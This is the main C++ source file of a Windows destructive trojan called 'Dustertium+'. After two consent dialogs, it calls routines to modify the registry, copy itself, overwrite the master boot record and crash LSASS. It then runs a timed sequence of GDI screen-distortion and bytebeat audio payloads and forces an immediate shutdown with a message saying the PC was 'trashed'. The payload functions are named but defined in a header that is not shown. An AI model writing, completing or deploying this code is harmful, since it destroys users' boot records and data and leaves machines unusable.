typedef struct IUnknown IUnknown;

#include "Lixo.h"
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{
	//If the computer wasn't infected before, it shows the warning messages.
	if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES)
	{
		if (MessageBoxW(NULL, L"you are about to run a malware called Dustertium+.exe Malware. (Dustertium Plus.exe full version Private Malware) \n\r\n by running this program clicking yes, then you accept the risk of the damage you cause. \n\r\n dont try anything or other things that are not yours or others thing that belong to you if you dont know what this does click no to make your computer safe. \n\r\n ARE YOU SURE YOU WANT TO RUN THIS PROGRAM? Kozaresponding2 is not responsible for any data loss or damages to your computer.", L"T.E.R.A.I.S feels my pain... but its nothing to me... youll see...", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
		if (MessageBoxW(NULL, L"THIS IS THE FINAL WARNING. \n\r\n keep in mind that your computer is going to be destroyed clicking yes destroys your pc. YOU WONT BE ABLE TO USE WINDOWS AGAIN. KozaResponding2 is not responsible for any data loss or damage to your computer.\n\r\n are you still sure you want to execute this? this is your final chance to get rid of this program.", L"your pretty sure arent you? but youll lose your data. or i think so...", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	}
	// note: this source code is private
	//Create/Modify some Registry keys + Create copies of itself + Overwrite MBR In The Mandelbrot set
	GDIPayloads::SpecialPayload();
	GDIPayloads::OverwriteMBR();

	Sleep(1000 * 5); // starts now

	// it will create a file to check if the pc was infected before.
	if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES)
	
		Sleep(1000 * 5); // 1 second until it starts

	System::RedrawScreen();
	
	//Shaking Payloads + CAPSLOCK + Windows Start Up Message Trojan
	HANDLE hBB1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hCL1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE STARTM2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat1, hBB1, NULL, NULL);
	HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload1, hPML1, NULL, NULL);
	// please note it will turn on capslock and also show a windows start up message box
	// this will damage your computer for a long time.
	// it was for entertainment and educational purposes only.
	// it looks simliar to purgatorium.exe trojan/malware
	// THIS IS NOT GDI PAYLOADS::SHUTDOWNPC() DO NOT USE IT
	// note: capslock and windows start up message will run together with the shaking payload so, dont delete that.
	// sorry if the namespace payloads doesnt work.
	// Payloads here: ↓
	HANDLE hCAPS = CreateThread(NULL, NULL, &GDIPayloads::CAPSLOCK, hCL1, NULL, NULL);
	HANDLE hMENU = CreateThread(NULL, NULL, &GDIPayloads::STARTMENU, STARTM2, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds 

	//Shaders
	HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload2, hPML2, NULL, NULL);
	Sleep(1000 * 32); //32 Seconds 
	System::EndPayload(hPayload2, hPML2);
	System::EndPayload(hBytebeat1, hBB1);

	//Icons
	HANDLE hBB2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat2, hBB2, NULL, NULL);
	HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload3, hPML3, NULL, NULL);
	Sleep(1000 * 0); // starts now

	// Triangle warning fractals
	HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPayload4 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload4, hPML4, NULL, NULL);
	Sleep(1000 * 30);

	//AlphaBlend
	HANDLE hPML5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBB999 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPayload5 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload5, hPML5, NULL, NULL);
	HANDLE hByte11 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat11, hBB999, NULL, NULL);
	Sleep(1000 * 30); //30 Seconds

	System::EndPayload(hPayload1, hPML1);
	System::EndPayload(hPayload3, hPML3);
	System::EndPayload(hPayload4, hPML4);
	System::EndPayload(hPayload5, hPML5);
	System::EndPayload(hBytebeat2, hBB2);
	System::EndPayload(hByte11, hBB999);

	//XOR Fractal + 3D Cube
	HANDLE hBB3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE Message3DCubeMatrix = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat3, hBB3, NULL, NULL);
	HANDLE hPayload6 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload6, hPML6, NULL, NULL);
	HANDLE h3DPayloadDestructive = CreateThread(NULL, NULL, &GDIPayloads::Message, Message3DCubeMatrix, NULL, NULL);
	Sleep(1000 * 32); //32 Seconds 
	System::EndPayload(hPayload6, hPML6);
	System::EndPayload(hBytebeat3, hBB3);
	System::EndPayload(h3DPayloadDestructive, Message3DCubeMatrix);
	//Plasma
	HANDLE hBB4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat4 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat4, hBB4, NULL, NULL);
	HANDLE hPayload7 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload7, hPML7, NULL, NULL);
	Sleep(1000 * 32); //32 Seconds 
	System::EndPayload(hPayload7, hPML7);
	System::EndPayload(hBytebeat4, hBB4);
	System::RedrawScreen();

	//Mandelbrot
	HANDLE hBB5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat5 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat5, hBB5, NULL, NULL);
	HANDLE hPayload8 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload8, hPML8, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds 
	System::EndPayload(hPayload8, hPML8);
	System::EndPayload(hBytebeat5, hBB5);

	//Crazy Circles + Pixelated Colors
	HANDLE hBB6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat6 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat6, hBB6, NULL, NULL);
	HANDLE hPayload9 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload9, hPML9, NULL, NULL);
	Sleep(1000 * 20); //20 Seconds 
	System::EndPayload(hPayload9, hPML9);
	System::EndPayload(hBytebeat6, hBB6);
	GDIPayloads::CrashLSASS();

	//Hell
	HANDLE hBB7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat7 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat7, hBB7, NULL, NULL);
	HANDLE hPayload10 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload10, hPML10, NULL, NULL);
	Sleep(1000 * 20); //20 Seconds 
	System::EndPayload(hPayload10, hPML10);
	System::EndPayload(hBytebeat7, hBB7);
	System::RedrawScreen();

	//Pixelated
	HANDLE hBB8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat8 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat8, hBB8, NULL, NULL);
	HANDLE hPayload11 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload11, hPML11, NULL, NULL);
	Sleep(1000 * 40); //40 Seconds 
	System::EndPayload(hPayload11, hPML11);
	System::EndPayload(hBytebeat8, hBB8);

	//Shake + Glitchs LAST PAYLOAD TILL IT STOPS
	HANDLE hBB9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat9 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat9, hBB9, NULL, NULL);
	HANDLE hPayload12 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload12, hPML12, NULL, NULL);
	Sleep(1000 * 37); // full version of D.U.S.T.E.R.T.I.U.M HSL Private Trojan
	System::EndPayload(hPayload12, hPML12);
	System::EndPayload(hBytebeat9, hBB9);
	HANDLE hBB10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML13 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat10 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat10, hBB10, NULL, NULL);
	HANDLE hPayload13 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload13, hPML13, NULL, NULL);
	Sleep(1000 * 32); // simliar to Purgatorium.exe Trojan/Malware
	System::EndPayload(hPayload13, hPML13);
	System::EndPayload(hBytebeat10, hBB10);
	HANDLE hBB15 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML14 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hWSU1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat12 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat12, hBB15, NULL, NULL);
	HANDLE WINDOWSWSU = CreateThread(NULL, NULL, &GDIPayloads::WINDOWSSTART, hWSU1, NULL, NULL);
	Sleep(1000 * 32); //32 Seconds
	System::EndPayload(hBytebeat12, hBB15);
	System::EndPayload(WINDOWSWSU, hWSU1);
	system("shutdown /s /f /t 0");
	MessageBoxW(NULL, L"your pc was trashed by the Dustertium+.exe (plus) HSL Trojan! have fun restoring your mbr also your harddrive!\n\r\n sorry if i cant do bsod theres an problem. if you want to close this program, click ok to proceed.", L"?????????????????????????????????????????????????????????????????????????????????????????????", MB_OK | MB_ICONERROR);
	return 0;
}